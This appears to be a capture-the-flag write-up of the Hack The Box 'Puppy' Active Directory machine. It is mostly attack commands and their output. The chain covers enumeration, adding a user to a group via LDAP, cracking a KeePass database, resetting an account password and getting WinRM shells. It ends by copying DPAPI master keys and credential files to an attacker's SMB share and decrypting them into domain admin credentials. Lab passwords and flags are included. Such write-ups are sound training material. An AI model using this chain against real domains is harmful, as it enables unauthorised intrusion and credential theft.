
As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james:KingofAkron2025!

## NMAP SCAN

```
nmap -sSCV -p- 10.129.232.75                                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-27 19:08 +0700
Nmap scan report for 10.129.232.75
Host is up (0.070s latency).
Not shown: 65513 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 13:40:04Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3         2049/udp   nfs
|   100005  1,2,3       2049/udp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100024  1           2049/tcp   status
|_  100024  1           2049/udp   status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
59901/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-27T13:41:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 1h29m57s

```

```
smbclient -L //10.129.232.75/ -U 'levi.james%KingofAkron2025!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      DEV-SHARE for PUPPY-DEVS
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```

DEV share is interestin..... but cannot ls the folder with the given creds first have to find creds for a DEV group...

```
rpcclient -U 'levi.james%KingofAkron2025!' 10.129.232.75
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

got users but lets confirm it using impacket too...
```
impacket-lookupsid levi.james@10.129.232.75 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.232.75
[*] StringBinding ncacn_np:10.129.232.75[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1487982659-1829050783-2281216199
498: PUPPY\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: PUPPY\Administrator (SidTypeUser)
501: PUPPY\Guest (SidTypeUser)
502: PUPPY\krbtgt (SidTypeUser)
512: PUPPY\Domain Admins (SidTypeGroup)
513: PUPPY\Domain Users (SidTypeGroup)
514: PUPPY\Domain Guests (SidTypeGroup)
515: PUPPY\Domain Computers (SidTypeGroup)
516: PUPPY\Domain Controllers (SidTypeGroup)
517: PUPPY\Cert Publishers (SidTypeAlias)
518: PUPPY\Schema Admins (SidTypeGroup)
519: PUPPY\Enterprise Admins (SidTypeGroup)
520: PUPPY\Group Policy Creator Owners (SidTypeGroup)
521: PUPPY\Read-only Domain Controllers (SidTypeGroup)
522: PUPPY\Cloneable Domain Controllers (SidTypeGroup)
525: PUPPY\Protected Users (SidTypeGroup)
526: PUPPY\Key Admins (SidTypeGroup)
527: PUPPY\Enterprise Key Admins (SidTypeGroup)
553: PUPPY\RAS and IAS Servers (SidTypeAlias)
571: PUPPY\Allowed RODC Password Replication Group (SidTypeAlias)
572: PUPPY\Denied RODC Password Replication Group (SidTypeAlias)
1000: PUPPY\DC$ (SidTypeUser)
1101: PUPPY\DnsAdmins (SidTypeAlias)
1102: PUPPY\DnsUpdateProxy (SidTypeGroup)
1103: PUPPY\levi.james (SidTypeUser)
1104: PUPPY\ant.edwards (SidTypeUser)
1105: PUPPY\adam.silver (SidTypeUser)
1106: PUPPY\jamie.williams (SidTypeUser)
1107: PUPPY\steph.cooper (SidTypeUser)
1108: PUPPY\HR (SidTypeGroup)
1109: PUPPY\SENIOR DEVS (SidTypeGroup)
1111: PUPPY\steph.cooper_adm (SidTypeUser)
1112: PUPPY\Access-Denied Assistance Users (SidTypeAlias)
1113: PUPPY\DEVELOPERS (SidTypeGroup)
```

same users as rpc
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                        
group:[Domain Admins] rid:[0x200]                                                  
group:[Domain Users] rid:[0x201]                                                   
group:[Domain Guests] rid:[0x202]                                                  
group:[Domain Computers] rid:[0x203]                                               
group:[Domain Controllers] rid:[0x204]                                             
group:[Schema Admins] rid:[0x206]                                                  
group:[Enterprise Admins] rid:[0x207]                                              group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[HR] rid:[0x454]
group:[SENIOR DEVS] rid:[0x455]
group:[DEVELOPERS] rid:[0x459]
```

GPCO is interesting groups.. maybe use this for priv esc later...

```
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 29S
INFO: Compressing output into 20260427211709_bloodhound.zip

```

lets try bloodhound and there is a dc 
levi is part of hr which has generic write on DEV's so lets add levi in the DEV to see DEV smb share.....
```
ldapsearch -x -H ldap://10.129.232.75 -D 'levi.james@puppy.htb' -w 'KingofAkron2025!' -b "DC=PUPPY,DC=HTB" "(|(sAMAccountName=levi.james)(sAMAccountName=Developers))" dn

# extended LDIF
#
# LDAPv3
# base <DC=PUPPY,DC=HTB> with scope subtree
# filter: (|(sAMAccountName=levi.james)(sAMAccountName=Developers))
# requesting: dn 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB

# Levi B. James, MANPOWER, PUPPY.HTB
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3

```

got the DN that will be used to add us 
```
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```
so we will save this file as `add_member.ldif` and use it to add us 
```
ldapmodify -x -H ldap://10.129.232.75 -D 'levi.james@puppy.htb' -w 'KingofAkron2025!' -f add_member.ldif
modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.232.75/DEV -U 'levi.james%KingofAkron2025!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 14:07:57 2025
  ..                                  D        0  Sat Mar  8 23:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 14:09:12 2025
  Projects                            D        0  Sat Mar  8 23:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 09:25:46 2025
```

we are in as DEV
```
python3 keepass2john.py recovery.kdbx > keepass.hash
```

made hash file out of this 
cleared hash of this and made a new file hash.txt 
```
$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```

```
hashcat hash.txt /usr/share/wordlists/rockyou.txt

$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9:liverpool
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 34300 (KeePass (KDBX v4))
Hash.Target......: $keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723c...aef0e9
Time.Started.....: Mon Apr 27 21:47:19 2026 (26 secs)
Time.Estimated...: Mon Apr 27 21:47:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:        2 H/s (20.13ms) @ Accel:5 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 40/14344385 (0.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 35/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:147-148
Candidate.Engine.: Device Generator
Candidates.#01...: liverpool -> 123123
Hardware.Mon.#01.: Util: 51%

```

this password is for the recovery file which stores the passwords... so lets open the recovery file and see 

```
echo "liverpool" | keepassxc-cli ls recovery.kdbx

Enter password to unlock recovery.kdbx: 
JAMIE WILLIAMSON
ADAM SILVER
ANTONY C. EDWARDS
STEVE TUCKER
SAMUEL BLAKE
```
interesting got new users.... 

```
echo "liverpool" | keepassxc-cli export --format csv recovery.kdbx > passwords_dump.csv

Enter password to unlock recovery.kdbx: 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls
 add_member.ldif   Desktop   Documents   Downloads   exploits   hash.txt  'HTB BOXES'   keepass2john.py   keepass.hash   Music   passwords_dump.csv   Pictures   Public   recovery.kdbx   Templates   Videos
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat passwords_dump.csv 
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-03-10T08:57:58Z","2025-03-10T08:57:01Z"
"Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-03-10T08:58:07Z"
"Root","ANTONY C. EDWARDS","","Antman2025!","puppy.htb","","","0","2025-03-10T09:00:02Z","2025-03-10T08:58:46Z"
"Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","2025-03-10T09:01:26Z"
"Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-03-10T09:02:03Z"
```

got passwords.... 
lets check in bloodhound which user is useful then move forward
lets try to use adam silver because he is a member of remote management users... so maybe we can winrm 
not usefull at all because winrm connects but doesnt work....

lets try ant.edwards as he is the only member of senior devs maybe we get something ? 

```
nxc smb 10.129.232.75 -u 'ant.edwards' -p 'Antman2025!' --shares --smb-timeout 10
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ,WRITE      DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
```

so just read and write permissions....

## STEPH COOPER ADM is needed to get to Admin
![[Pasted image 20260427134143.png|697]]


so ant.edwards is a member of Senior Dev. who has GenericAll right on Adam Silver
Adam Silver is member of remote management with steph cooper maybe we can pivot from there lets see 

```
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.129.232.75 set password 'adam.silver' 'ComplexPass2025!'

[+] Password changed successfully!
```

now lets try to winrm 
doesnt work same as before... 

```
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.129.232.75 remove uac 'adam.silver' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

activated the account now lets look...
the password we got and changed to a new one are not working...

**So there was a script running which was resetting everything we did...**
**so the correct way is** 
**using ant.edwards enable the adam account then use the password we got before or use the new password which we put there and then check using netexec.**

```
┌──(kali㉿kali)-[~]
└─$ bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.129.232.75 remove uac 'adam.silver' -f ACCOUNTDISABLE       
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.129.232.75 set password 'adam.silver' 'ComplexPass2025!'
[+] Password changed successfully!
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.232.75 -u 'adam.silver' -p 'ComplexPass2025!'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\adam.silver:ComplexPass2025! 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.232.75 -u 'adam.silver' -p 'ComplexPass2025!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ..
*Evil-WinRM* PS C:\Users\adam.silver> cd Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
203defd7e8479856248d0e1840697e6b

```

got user flag....
```
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/3/2025   8:26 AM                adam.silver
d-----         3/11/2025   9:14 PM                Administrator
d-----          3/8/2025   8:52 AM                ant.edwards
d-r---         2/19/2025  11:34 AM                Public
d-----          3/8/2025   7:40 AM                steph.cooper

```

only these users can winrm and are there on the dc
in backup folder there was a zip file ...
```
*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

```
─(kali㉿kali)-[~/HTB BOXES/Puppy/backup/puppy]
└─$ cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>

```

got pass for steph.cooper ChefSteph2025!

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files (T1555.003)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
```
got creds file using winPEAS

```
impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[BLOB]
Version          :        1 (1)
Guid Credential  : DF9D8CD0-1501-11D1-8C7A-00C04FC297EB
MasterKeyVersion :        1 (1)
Guid MasterKey   : 556A2412-1275-4CCF-B721-E6A0B4F90407
Flags            : 20000000 (CRYPTPROTECT_SYSTEM)
Description      : Local Credential Data
```

got the master key lets locate it and download
```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> cd S-1-5-21-1487982659-1829050783-2281216199-1107
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

lets get the key

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy 556A2412-1275-4CCF-B721-E6A0B4F90407 \\10.10.14.53\loot\masterkey
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> cd ..
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> cd ..
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft> ls


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          3/8/2025   7:53 AM                Credentials
d---s-          3/8/2025   7:40 AM                Crypto
d-----          3/8/2025   7:40 AM                Internet Explorer
d-----          3/8/2025   7:40 AM                Network
d---s-          3/8/2025   7:40 AM                Protect
d-----          5/8/2021   1:20 AM                Spelling
d---s-         2/23/2025   2:35 PM                SystemCertificates
d-----         2/23/2025   2:36 PM                Vault
d-----          3/8/2025   7:52 AM                Windows


*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft> cd Credentials
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> ls -force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9


*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> copy C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\10.10.14.53\loot\
```

got the masterkey which will decrpyt the creds file 

## There are 2 creds file one has name of masterkey and other has creds for steph adm

```
impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'                                                                                 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```
got the key to unlock the 2nd creds file...

```
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

```

got the creds....
```
evil-winrm -i 10.129.232.75 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> cd ..
*Evil-WinRM* PS C:\Users\steph.cooper_adm> cd Desktop
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Desktop> ls
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Desktop> ls -force
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Desktop> cd ..
*Evil-WinRM* PS C:\Users\steph.cooper_adm> cd ..
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/27/2026   6:36 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
fa4dcf40382a71dd4c19da177b379a1f
```